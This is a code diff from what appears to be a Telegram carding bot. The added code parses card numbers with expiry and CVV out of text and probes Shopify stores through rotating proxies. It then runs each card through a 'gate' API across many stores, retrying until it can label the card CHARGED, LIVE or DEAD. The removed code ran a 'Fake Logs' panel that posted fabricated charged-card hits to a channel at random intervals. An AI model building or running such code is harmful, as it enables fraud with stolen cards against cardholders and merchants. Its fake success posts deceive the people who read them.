+                _SITES_RAW_CACHE = raw_lines
+                _SITES_RAW_TS    = time.time()
+                result = list(raw_lines)
+                random.shuffle(result)
+                logging.info(f"[SH] {len(result)} sites loaded from {path}")
+                return result
+        except (FileNotFoundError, PermissionError):
+            pass
+    raise RuntimeError(
+        "sites.txt not found or empty — create sites.txt with one Shopify domain per line"
     )
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# SITE PROBER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _probe_one_site(site: str, proxies: list) -> bool:
+    MAX_PROBE_RETRIES = 3
+    for attempt in range(MAX_PROBE_RETRIES):
+        px = random.choice(proxies) if proxies else None
+        try:
+            resp, gw, price, currency, http_st = await _call_api(
+                PROBE_CARD, site, px, timeout=PROBE_TIMEOUT
+            )
+        except Exception:
+            await asyncio.sleep(0.3)
+            continue
 
-def _build_log_buttons(bd: dict):
-    """Build the inline keyboard from the 3 configurable link slots."""
-    links = _get_links(bd)
-    row   = []
-    for lnk in links:
-        txt = lnk.get("text", "").strip()
-        url = lnk.get("url",  "").strip()
-        if txt and url:
-            row.append(_btn(txt, url=url, style="primary"))
-    if not row:
-        # fallback: always show at least the bot button with custom emoji
-        row = [_btn("𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", url=BOT_USERNAME_LINK, style="primary", icon=CARD_CHK_BTN_EMOJI_ID)]
-    return RawMarkup([row])
+        if http_st and http_st not in (200,):
+            return False
+        if gw.upper().strip() != "SHOPIFY PAYMENTS":
+            return False
 
+        resp_upper = resp.upper().strip()
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# ONE DELIVERY ATTEMPT
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
+            logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
+            return False
+        if _is_dead_site_response(resp):
+            await asyncio.sleep(0.3)
+            continue
 
-async def _job(context: ContextTypes.DEFAULT_TYPE) -> None:
-    bd = context.bot_data
-
-    if not bd.get(_K_ACTIVE):
-        return
-
-    target = _get_channel(bd)
-    if not target:
-        logger.warning("[FAKELOGS] No channel ID set — stopping.")
-        bd[_K_ACTIVE] = False
-        return
-
-    ids = [e for e in _get_ids(bd) if e.get("enabled", True)]
-    lo, hi = _SPEEDS[_get_speed(bd)]
-
-    if not isinstance(target, int) or target >= 0:
-        bd["fl_last_error"] = (
-            "Invalid target ID. Set FAKE_LOG_CHANNEL_ID to a negative channel/group ID."
-        )
-        bd[_K_ACTIVE] = False
-        _stop_job(context)
-        return
-
-    if not ids:
-        bd["fl_last_error"] = "No enabled display IDs are configured."
-        bd[_K_ACTIVE] = False
-        _stop_job(context)
-        return
-
-    entry = random.choice(ids)
-    text  = _build_log_text(entry)
-    try:
-        await _send_with_retry(
-            context, target, text, _build_log_buttons(bd)
-        )
-        entry["count"] = entry.get("count", 0) + 1
-        bd["fl_last_error"] = ""
-    except (Forbidden, BadRequest) as exc:
-        bd["fl_failed"] = bd.get("fl_failed", 0) + 1
-        bd["fl_last_error"] = str(exc)[:500]
-        bd[_K_ACTIVE] = False
-        _stop_job(context)
-        logger.warning(f"[FAKELOGS] send failed (chat={target}); stream stopped: {exc}")
-        return
-    except Exception as exc:
-        # Temporary failures are recorded, but the server-side stream remains
-        # active and the next event is still scheduled below.
-        bd["fl_failed"] = bd.get("fl_failed", 0) + 1
-        bd["fl_last_error"] = str(exc)[:500]
-        logger.warning(f"[FAKELOGS] temporary send failure (chat={target}): {exc}")
-
-async def _stream(application) -> None:
-    """Keep delivery alive in the bot process, not in the owner's chat session."""
-    bd = application.bot_data
-    try:
-        while bd.get(_K_ACTIVE):
-            lo, hi = _SPEEDS[_get_speed(bd)]
-            await asyncio.sleep(random.uniform(lo, hi))
-            if not bd.get(_K_ACTIVE):
-                break
+        if _is_success_response(resp):
             try:
-                await _job(application)
-            except asyncio.CancelledError:
-                raise
-            except Exception as exc:
-                bd["fl_failed"] = bd.get("fl_failed", 0) + 1
-                bd["fl_last_error"] = f"Unexpected stream error: {str(exc)[:400]}"
-                logger.exception("[FAKELOGS] stream iteration failed; continuing")
+                p = float(re.sub(r"[^\d.]", "", str(price)))
+                if p > 20.0:
+                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
+                    return False
+            except Exception:
+                pass
+            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
+            return True
+
+        await asyncio.sleep(0.2)
+        continue
+
+    return False
+
+async def probe_all_sites(all_sites: list, proxies: list, on_progress=None) -> list:
+    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN
+
+    if _PROBE_IN_PROGRESS:
+        logging.info("[PROBE] already running — skipping duplicate call")
+        return _WORKING_SITES or all_sites
+
+    _PROBE_IN_PROGRESS = True
+    logging.info(f"[PROBE] Starting: {len(all_sites)} sites, "
+                 f"{len(proxies)} proxies, concurrency={PROBE_CONCURRENCY}")
+
+    sem     = asyncio.Semaphore(PROBE_CONCURRENCY)
+    working = []
+    done_n  = 0
+    total   = len(all_sites)
+    tasks: list = []
+
+    async def _check_one(site):
+        nonlocal done_n
+        try:
+            async with sem:
+                try:
+                    result = await _probe_one_site(site, proxies)
+                except asyncio.CancelledError:
+                    raise
+                except Exception:
+                    result = False
+                done_n += 1
+                if result:
+                    working.append(site)
+                if on_progress and done_n % 50 == 0:
+                    try:
+                        await on_progress(done_n, total)
+                    except Exception:
+                        pass
+        except asyncio.CancelledError:
+            raise
+        except RuntimeError:
+            pass
+
+    try:
+        tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
+        await asyncio.gather(*tasks, return_exceptions=True)
     except asyncio.CancelledError:
-        # Cancellation is the normal result of Stop Logs or /fakeoff.
+        for t in tasks:
+            t.cancel()
+        await asyncio.gather(*tasks, return_exceptions=True)
         raise
     finally:
-        if bd.get(_K_TASK) is asyncio.current_task():
-            bd.pop(_K_TASK, None)
+        _PROBE_IN_PROGRESS = False
 
+    if working:
+        random.shuffle(working)
+        _WORKING_SITES  = working
+        _PROBE_LAST_RUN = time.time()
+        logging.info(f"[PROBE] ✅ {len(working)}/{total} sites alive")
+    else:
+        logging.warning("[PROBE] ⚠️ 0 working sites found — "
+                        "keeping previous cache or using full list")
+        if not _WORKING_SITES:
+            _WORKING_SITES = list(all_sites)
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# UI PANEL BUILDERS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    return _WORKING_SITES
 
-# ─── MAIN PANEL ──────────────────────────────────────────────────────────────
+def get_working_sites() -> list:
+    return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()
 
-def _main_text(bd: dict) -> str:
-    active  = bd.get(_K_ACTIVE, False)
-    speed   = _get_speed(bd)
-    ids     = _get_ids(bd)
-    on_ct   = sum(1 for e in ids if e.get("enabled", True))
-    status  = "🟢 RUNNING" if active else "🔴 STOPPED"
-    target  = _get_channel(bd)
-    cid_str = f"<code>{target}</code>" if target else "<i>not set — tap 📡 Channel to set</i>"
+async def _auto_probe_loop(all_sites: list, proxies: list):
+    try:
+        await asyncio.sleep(5)
+    except asyncio.CancelledError:
+        return
+    while True:
+        try:
+            await probe_all_sites(all_sites, proxies)
+        except asyncio.CancelledError:
+            logging.info("[PROBE] background probe cancelled — shutting down")
+            return
+        except Exception as exc:
+            logging.error(f"[PROBE] background error: {exc}")
+        try:
+            await asyncio.sleep(PROBE_TTL)
+        except asyncio.CancelledError:
+            logging.info("[PROBE] background sleep cancelled — shutting down")
+            return
 
-    links  = _get_links(bd)
-    active_links = sum(1 for l in links if l.get("text") and l.get("url"))
+def start_probe_background(all_sites: list, proxies: list) -> None:
+    global _PROBE_TASK
+    _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))
+    def _on_done(t: asyncio.Task):
+        if not t.cancelled():
+            exc = t.exception()
+            if exc:
+                logging.error(f"[PROBE] background task died: {exc}")
+    _PROBE_TASK.add_done_callback(_on_done)
 
-    return (
-        f"<b>🎭 Fake Logs Control Panel</b>\n"
-        f"──────────────────\n"
-        f"<b>Status  ➛</b> {status}\n"
-        f"<b>Channel ➛</b> {cid_str}\n"
-        f"<b>Speed   ➛</b> {_SPEED_LABELS[speed]}\n"
-        f"<b>IDs     ➛</b> {on_ct}/{len(ids)} enabled\n"
-        f"<b>Links   ➛</b> {active_links}/3 buttons configured\n"
-        f"──────────────────"
-    )
+async def stop_probe_background() -> None:
+    global _PROBE_TASK
+    task = _PROBE_TASK
+    if task is None or task.done():
+        return
+    task.cancel()
+    try:
+        await asyncio.wait_for(asyncio.shield(task), timeout=6.0)
+    except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
+        pass
+    _PROBE_TASK = None
+    logging.info("[PROBE] background prober stopped cleanly")
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CARD UTILITIES
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def luhn_check(n: str) -> bool:
+    n = str(n).strip()
+    if not n.isdigit(): return False
+    t = 0
+    for i, c in enumerate(n[::-1]):
+        d = int(c)
+        if i % 2 == 1:
+            d *= 2
+            if d > 9: d -= 9
+        t += d
+    return t % 10 == 0
 
-def _main_kb(bd: dict) -> InlineKeyboardMarkup:
-    active = bd.get(_K_ACTIVE, False)
-    lbl    = "⛔ Stop Logs" if active else "▶️ Start Logs"
-    cb     = "fl_stop"      if active else "fl_start"
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("📋 IDs",      callback_data="fl_ids"),
-            InlineKeyboardButton("⚡ Speed",    callback_data="fl_speed"),
-            InlineKeyboardButton("📊 Stats",    callback_data="fl_show"),
-        ],
-        [
-            InlineKeyboardButton("🔗 Links",    callback_data="fl_links"),
-            InlineKeyboardButton("📡 Channel",  callback_data="fl_channel"),
-        ],
-        [InlineKeyboardButton(lbl, callback_data=cb)],
-    ])
+def is_expired(mm: str, yy: str) -> bool:
+    try:
+        now = datetime.now()
+        ey, em = int(yy), int(mm)
+        if ey < now.year % 100: return True
+        if ey == now.year % 100 and em < now.month: return True
+        return False
+    except ValueError:
+        return True
 
-
-# ─── IDS PANEL ───────────────────────────────────────────────────────────────
-
-def _ids_text(bd: dict) -> str:
-    ids = _get_ids(bd)
-    if not ids:
-        return (
-            "<b>📋 Fake Log IDs</b>\n──────────────────\n"
-            "No IDs added yet.\n\n"
-            "Tap <b>➕ Add ID</b> then send:\n"
-            "<code>123456789 @username</code>  or just  <code>@username</code>\n\n"
-            "<i>Added IDs are memory-only and reset when the bot restarts.</i>"
-        )
-    lines = ["<b>📋 Fake Log IDs</b>", "──────────────────"]
-    for e in ids:
-        icon = "🟢" if e.get("enabled", True) else "🔴"
-        ct   = e.get("count", 0)
-        lines.append(f"{icon} {e['display']}  —  {ct} fake hit{'s' if ct != 1 else ''}")
-    lines.append("──────────────────\nToggle or remove IDs with the buttons below.")
-    return "\n".join(lines)
-
-
-def _ids_kb(bd: dict) -> InlineKeyboardMarkup:
-    ids  = _get_ids(bd)
-    rows = []
-    for i, e in enumerate(ids):
-        on  = e.get("enabled", True)
-        tog = "🟢 ON" if on else "🔴 OFF"
-        rows.append([
-            InlineKeyboardButton(e["display"],  callback_data="fl_noop"),
-            InlineKeyboardButton(tog,            callback_data=f"fltog_{i}"),
-            InlineKeyboardButton("❌ Remove",   callback_data=f"flrem_{i}"),
-        ])
-    rows.append([
-        InlineKeyboardButton("➕ Add ID", callback_data="fl_addid"),
-        InlineKeyboardButton("🔙 Back",   callback_data="fl_panel"),
-    ])
-    return InlineKeyboardMarkup(rows)
-
-
-# ─── SPEED PANEL ─────────────────────────────────────────────────────────────
-
-def _speed_text() -> str:
-    return (
-        "<b>⚡ Fake Log Speed</b>\n──────────────────\n"
-        "Choose how fast fake CHARGED hits appear in the channel.\n"
-        "All delays are <b>randomised</b> — no fixed pattern.\n"
-        "──────────────────"
-    )
-
-
-def _speed_kb(bd: dict) -> InlineKeyboardMarkup:
-    cur  = _get_speed(bd)
-    rows = []
-    for key, label in _SPEED_LABELS.items():
-        check = "✅ " if key == cur else "      "
-        rows.append([InlineKeyboardButton(f"{check}{label}", callback_data=f"flspd_{key}")])
-    rows.append([InlineKeyboardButton("🔙 Back", callback_data="fl_panel")])
-    return InlineKeyboardMarkup(rows)
-
-
-# ─── STATS PANEL ─────────────────────────────────────────────────────────────
-
-def _show_text(bd: dict) -> str:
-    ids   = _get_ids(bd)
-    speed = _get_speed(bd)
-    if not ids:
-        return "<b>📊 Fake Log Stats</b>\n──────────────────\nNo IDs configured yet."
-    lines = ["<b>📊 Fake Log Stats</b>", "──────────────────"]
-    total = 0
-    for e in ids:
-        on     = "🟢" if e.get("enabled", True) else "🔴"
-        ct     = e.get("count", 0)
-        total += ct
-        tag    = "" if e.get("enabled", True) else " <i>(off)</i>"
-        lines.append(f"{on} {e['display']} — <b>{ct}</b> hit{'s' if ct != 1 else ''}{tag}")
-    lines += [
-        "──────────────────",
-        f"<b>Total fake hits sent ➛ {total}</b>",
-        f"<b>Speed ➛ {_SPEED_LABELS[speed]}</b>",
+def extract_cards(text: str) -> list:
+    patterns = [
+        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
+        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
     ]
-    failed = bd.get("fl_failed", 0)
-    last_error = bd.get("fl_last_error", "")
-    if failed:
-        lines.append(f"<b>Failed deliveries ➛ {failed}</b>")
-        if last_error:
-            lines.append(f"<b>Last error ➛</b> <code>{last_error}</code>")
-    return "\n".join(lines)
+    seen, results = set(), []
+    for pat in patterns:
+        for m in re.findall(pat, text):
+            cc, mm, yy, cvv = m
+            mm = mm.zfill(2)
+            if len(yy) == 4: yy = yy[2:]
+            s = f"{cc}|{mm}|{yy}|{cvv}"
+            if s not in seen:
+                seen.add(s); results.append(s)
+    return results
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# API CALL
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _parse_response_field(data: dict) -> str:
+    if data.get("Status") is True:
+        return "ORDER_PAID"
+    for key in ("Response", "response", "message", "Message",
+                "result", "Result", "msg"):
+        val = data.get(key)
+        if val and isinstance(val, str) and val.strip():
+            resp = val.strip()
+            if resp.upper() == "ERROR":
+                return "site error! status: 500"
+            return resp
+    for key in ("error", "Error"):
+        val = data.get(key)
+        if val and isinstance(val, str) and val.strip():
+            return val.strip()
+    return "CARD_DECLINED"
 
-def _show_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🗑 Clear All Stats", callback_data="fl_clrstats")],
-        [InlineKeyboardButton("🔙 Back",            callback_data="fl_panel")],
-    ])
+def _proxy_url(proxy: Optional[str]) -> Optional[str]:
+    if not proxy: return None
+    p = proxy.strip()
+    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
+        return p
+    return f"http://{p}"
 
+def _normalise_gateway(raw: str) -> str:
+    cleaned = raw.replace("_", " ").replace("-", " ").strip().upper()
+    return cleaned
 
-# ─── LINKS PANEL ─────────────────────────────────────────────────────────────
+async def _call_api(card: str, site: str, proxy: Optional[str],
+                    timeout: float = SITE_TIMEOUT) -> tuple:
+    site_clean = _strip_scheme(site)
+    url = f"{API_URL}?cc={card}&site={site_clean}"
 
-def _links_text(bd: dict) -> str:
-    links = _get_links(bd)
-    lines = [
-        "<b>🔗 Fake Log Button Links</b>",
-        "──────────────────",
-        "These buttons appear on every fake log message.",
-        "Up to 3 buttons — leave text/URL empty to hide a slot.",
-        "──────────────────",
-    ]
-    for i, lnk in enumerate(links, 1):
-        txt = lnk.get("text", "").strip() or "<i>empty</i>"
-        url = lnk.get("url",  "").strip() or "<i>empty</i>"
-        lines.append(f"<b>Link {i}</b>")
-        lines.append(f"  📝 Text ➛ {txt}")
-        lines.append(f"  🔗 URL  ➛ {url}")
-    lines.append("──────────────────")
-    return "\n".join(lines)
+    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
+    try:
+        async with aiohttp.ClientSession(timeout=_to) as session:
+            async with session.get(url, ssl=False) as r:
+                http_st = r.status
+                raw     = await r.text()
 
+                if not raw or not raw.strip():
+                    return ("site error! status: 404",
+                            "Shopify Payments", "0.00", "USD", http_st)
 
-def _links_kb(bd: dict) -> InlineKeyboardMarkup:
-    links = _get_links(bd)
-    rows  = []
-    for i, lnk in enumerate(links):
-        label = lnk.get("text", "").strip() or f"Link {i+1} (empty)"
-        rows.append([
-            InlineKeyboardButton(f"✏️ {label}", callback_data=f"fledit_{i}"),
-        ])
-    rows.append([InlineKeyboardButton("🔙 Back", callback_data="fl_panel")])
-    return InlineKeyboardMarkup(rows)
+                if http_st == 200:
+                    try:
+                        data = _json.loads(raw)
+                    except Exception:
+                        return ("site error! status: 404",
+                                "Shopify Payments", "0.00", "USD", http_st)
 
+                    raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
+                    gw       = _normalise_gateway(raw_gw)
+                    price    = str(data.get("Price")    or data.get("price")    or "0.00")
+                    currency = str(data.get("Currency") or data.get("currency") or "USD")
+                    api_resp = _parse_response_field(data)
 
-def _link_edit_text(idx: int, bd: dict) -> str:
-    lnk  = _get_links(bd)[idx]
-    txt  = lnk.get("text", "").strip() or "<i>empty</i>"
-    url  = lnk.get("url",  "").strip() or "<i>empty</i>"
-    return (
-        f"<b>✏️ Edit Link {idx+1}</b>\n"
-        f"──────────────────\n"
-        f"<b>Current text ➛</b> {txt}\n"
-        f"<b>Current URL  ➛</b> {url}\n"
-        f"──────────────────\n"
-        f"Choose what to update:"
-    )
+                    logging.info(f"[API] {card[:6]}** {site_clean} "
+                                 f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
+                    return api_resp, gw, price, currency, http_st
 
+                _emap = {
+                    404: "site error! status: 404",
+                    403: "site error! status: 403",
+                    429: "site error! status: 429",
+                    500: "site error! status: 500",
+                    502: "site error! status: 502",
+                    503: "site error! status: 503",
+                    504: "timeout",
+                }
+                return (_emap.get(http_st, f"site error! status: {http_st}"),
+                        "Shopify Payments", "0.00", "USD", http_st)
 
-def _link_edit_kb(idx: int) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("📝 Set Text", callback_data=f"fllt_{idx}"),
-            InlineKeyboardButton("🔗 Set URL",  callback_data=f"fllu_{idx}"),
-        ],
-        [
-            InlineKeyboardButton("🗑 Clear Slot", callback_data=f"fllc_{idx}"),
-            InlineKeyboardButton("🔙 Back",       callback_data="fl_links"),
-        ],
-    ])
+    except asyncio.TimeoutError:
+        return ("timeout", "Shopify Payments", "0.00", "USD", None)
+    except asyncio.CancelledError:
+        raise
+    except Exception as e:
+        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CORE RETRY LOOP
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _check_card_with_retry(
+    _session,
+    card: str,
+    sites: list,
+    proxies: list,
+    max_sites: int      = SITE_RETRIES,
+    site_timeout: float = SITE_TIMEOUT,
+    sid: str            = "",
+) -> tuple:
+    if not sites:
+        sites = get_working_sites()
+        if not sites:
+            sites = _load_sites()
 
-# ─── CHANNEL PANEL ───────────────────────────────────────────────────────────
+    local_dead: set = set()
+    pool            = list(sites)
+    random.shuffle(pool)
+    px_pool         = list(proxies) if proxies else list(_ALL_PROXIES)
+    tried: set      = set()
+    price, currency  = "0.00", "USD"
+    last_resp        = "No sites responded"
+    consec_timeouts  = 0
+    consec_api_errs  = 0
+    attempt          = 0
 
-def _channel_text(bd: dict) -> str:
-    target  = _get_channel(bd)
-    cid_str = f"<code>{target}</code>" if target else "<i>not configured</i>"
-    return (
-        f"<b>📡 Fake Log Channel</b>\n"
-        f"──────────────────\n"
-        f"<b>Current channel ID ➛</b> {cid_str}\n"
-        f"──────────────────\n"
-        f"<b>How to set it from here (easiest):</b>\n"
-        f"Tap <b>✏️ Enter Channel ID</b> below, then type the\n"
-        f"channel ID in this DM — e.g. <code>-1001234567890</code>\n\n"
-        f"<b>How to get the ID:</b>\n"
-        f"1. Add the bot as <b>admin</b> of your target channel\n"
-        f"2. Forward any message from that channel to\n"
-        f"   @userinfobot — it shows the channel ID\n"
-        f"3. Paste that ID using the button below\n\n"
-        f"<i>Or send /getid inside the channel (bot must be admin).</i>"
-    )
+    async def _try_one(site: str, proxy: Optional[str]):
+        try:
+            return site, await _call_api(card, site, proxy, timeout=site_timeout)
+        except asyncio.CancelledError:
+            raise
+        except Exception as e:
+            return site, (f"connection error: {str(e)[:60]}",
+                          "Shopify Payments", "0.00", "USD", None)
 
+    def _pick_site() -> Optional[str]:
+        nonlocal pool
+        skip      = tried | local_dead
+        available = [s for s in pool if s not in skip]
+        if not available:
+            local_dead.clear()
+            tried.clear()
+            pool      = list(sites)
+            random.shuffle(pool)
+            available = pool[:]
+        if not available:
+            return None
+        s = random.choice(available)
+        tried.add(s)
+        return s
 
-def _channel_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✏️ Enter Channel ID", callback_data="fl_setchannel")],
-        [InlineKeyboardButton("🔙 Back",             callback_data="fl_panel")],
-    ])
+    while attempt < max_sites:
+        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
+            raise asyncio.CancelledError()
 
+        batch: list[str] = []
+        for _ in range(min(SITE_BATCH, max_sites - attempt)):
+            s = _pick_site()
+            if s and s not in batch:
+                batch.append(s)
+        if not batch:
+            break
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# COMMAND HANDLERS  (all owner-only, completely silent to others)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        attempt += len(batch)
 
-async def _cmd_fakeon(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """/fakeon — open the control panel. Owner-only, silent to everyone else."""
-    if not update.effective_user or update.effective_user.id != OWNER_ID:
-        return
-    bd = context.bot_data
-    _clear_state(bd)    # cancel any pending input waiting
-    await update.message.reply_text(
-        _main_text(bd),
-        parse_mode="HTML",
-        reply_markup=_main_kb(bd),
-    )
-
-
-async def _cmd_fakeoff(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """/fakeoff — stop the stream. Owner-only, silent to everyone else."""
-    if not update.effective_user or update.effective_user.id != OWNER_ID:
-        return
-    context.bot_data[_K_ACTIVE] = False
-    _stop_job(context)
-    _clear_state(context.bot_data)
-    await update.message.reply_text("<b>⛔ Fake logs stopped.</b>", parse_mode="HTML")
-
-
-async def _cmd_getid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """/getid — save current chat ID as the fake-log channel.
-    Can be run inside any channel (bot must be admin) or from DM.
-    From DM it shows the owner's own user ID — use the panel instead."""
-    if not update.effective_user or update.effective_user.id != OWNER_ID:
-        return
-    chat = update.effective_chat
-    if not chat or chat.type == "private":
-        await update.message.reply_text(
-            "<b>⚠️ /getid must be run in the target channel or group.</b>\n"
-            "For a channel, add this bot as an administrator first.\n"
-            "You can also set <code>FAKE_LOG_CHANNEL_ID=-100...</code> on Railway.",
-            parse_mode="HTML",
-        )
-        return
-    if chat.type not in ("channel", "group", "supergroup"):
-        await update.message.reply_text(
-            "<b>⚠️ This chat cannot be used as a log target.</b>",
-            parse_mode="HTML",
-        )
-        return
-    cid  = chat.id
-    context.bot_data[_K_CHANNEL] = cid
-    title = chat.title or "this DM"
-    await update.message.reply_text(
-        f"<b>📡 Chat ID saved!</b>\n"
-        f"──────────────────\n"
-        f"<b>ID    ➛</b> <code>{cid}</code>\n"
-        f"<b>Title ➛</b> {title}\n\n"
-        f"Fake logs will now go to this chat.\n"
-        f"Use /fakeon to start.",
-        parse_mode="HTML",
-    )
-
-
-async def _cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user = update.effective_user
-    if not user or not update.message:
-        return
-    await update.message.reply_text(
-        "<b>Your Telegram user ID</b>\n"
-        f"<code>{user.id}</code>\n\n"
-        "Set this exact number as Railway variable <code>OWNER_ID</code>, "
-        "then redeploy. Only that account can use /fakeon and /getid.",
-        parse_mode="HTML",
-    )
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MASTER CALLBACK HANDLER
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-async def _cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    q = update.callback_query
-    if not q.from_user or q.from_user.id != OWNER_ID:
-        await q.answer("⛔ Owner only.", show_alert=True)
-        return
-    await q.answer()
-
-    bd  = context.bot_data
-    dat = q.data
-
-    # ── Main panel ──────────────────────────────────────────────────────────
-    if dat == "fl_panel":
-        _clear_state(bd)
-        await q.edit_message_text(
-            _main_text(bd), parse_mode="HTML",
-            reply_markup=_main_kb(bd),
-        )
-
-    elif dat == "fl_start":
-        enabled = [e for e in _get_ids(bd) if e.get("enabled", True)]
-        if not enabled:
-            await q.answer("⚠️ Enable at least one ID first (📋 IDs).", show_alert=True)
-            return
-        if not _get_channel(bd):
-            await q.answer("⚠️ Set a channel ID first (📡 Channel).", show_alert=True)
-            return
-        target_error = await _validate_target(context.bot, _get_channel(bd))
-        if target_error:
-            bd[_K_ACTIVE] = False
-            bd["fl_failed"] = bd.get("fl_failed", 0) + 1
-            bd["fl_last_error"] = target_error
-            await q.answer(f"⚠️ {target_error}", show_alert=True)
-            await q.edit_message_text(
-                _main_text(bd), parse_mode="HTML",
-                reply_markup=_main_kb(bd),
+        tasks = [
+            asyncio.ensure_future(
+                _try_one(s, random.choice(px_pool) if px_pool else None)
             )
-            return
-        bd[_K_ACTIVE] = True
-        _stop_job(context)
-        # Send immediately, then run continuously in the server-side task.
-        await _job(context)
-        if bd.get(_K_ACTIVE):
-            bd[_K_TASK] = asyncio.create_task(_stream(context.application))
-        if bd.get("fl_last_error"):
-            await q.answer(
-                f"⚠️ Telegram delivery failed: {bd['fl_last_error'][:180]}",
-                show_alert=True,
+            for s in batch
+        ]
+
+        winner        = None
+        batch_timeouts = 0
+
+        try:
+            for fut in asyncio.as_completed(tasks):
+                try:
+                    site, (resp, gw, price, currency, http_st) = await fut
+                except asyncio.CancelledError:
+                    raise
+                except Exception:
+                    batch_timeouts += 1
+                    continue
+
+                logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
+                             f"site={site} → {resp!r}")
+
+                if resp == "timeout" or resp == "Timeout":
+                    batch_timeouts += 1
+                    local_dead.add(site)
+                    last_resp = resp
+                    continue
+
+                if http_st and http_st not in (200,):
+                    local_dead.add(site)
+                    last_resp = f"HTTP {http_st}"
+                    if http_st in (502, 503, 504):
+                        consec_api_errs += 1
+                    else:
+                        consec_api_errs = 0
+                    if consec_api_errs >= 5:
+                        logging.error(
+                            f"[SH] {card[:6]}** gate API returned HTTP {http_st} "
+                            f"{consec_api_errs}× in a row — API server is down, aborting."
+                        )
+                        return "DEAD", f"Gate API unavailable (HTTP {http_st})", price, currency
+                    continue
+
+                consec_api_errs = 0
+
+                if http_st == 429 or (resp and "status: 429" in resp.lower()):
+                    tried.discard(site)
+                    continue
+
+                classification = classify_response(resp)
+                last_resp      = resp
+
+                logging.info(f"[RESULT] {card[:6]}** #{attempt}/{max_sites} "
+                             f"→ {classification}  resp={resp!r}  site={site}")
+
+                if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
+                    winner = (classification, resp, price, currency)
+                    break
+
+                # RETRY / ERROR / RECHECK
+                local_dead.add(site)
+
+        except asyncio.CancelledError:
+            for t in tasks: t.cancel()
+            await asyncio.gather(*tasks, return_exceptions=True)
+            raise
+        finally:
+            for t in tasks: t.cancel()
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+        if winner:
+            return winner
+
+        if batch_timeouts == len(batch):
+            consec_timeouts += batch_timeouts
+        else:
+            consec_timeouts = 0
+
+        if consec_timeouts >= CONSEC_TIMEOUT_MAX:
+            logging.warning(
+                f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
+                f"({consec_timeouts * site_timeout:.0f}s wasted) — "
+                f"aborting early"
             )
-        await q.edit_message_text(
-            _main_text(bd), parse_mode="HTML",
-            reply_markup=_main_kb(bd),
-        )
+            return "DEAD", "timeout", price, currency
 
-    elif dat == "fl_stop":
-        bd[_K_ACTIVE] = False
-        _stop_job(context)
-        await q.edit_message_text(
-            _main_text(bd), parse_mode="HTML",
-            reply_markup=_main_kb(bd),
-        )
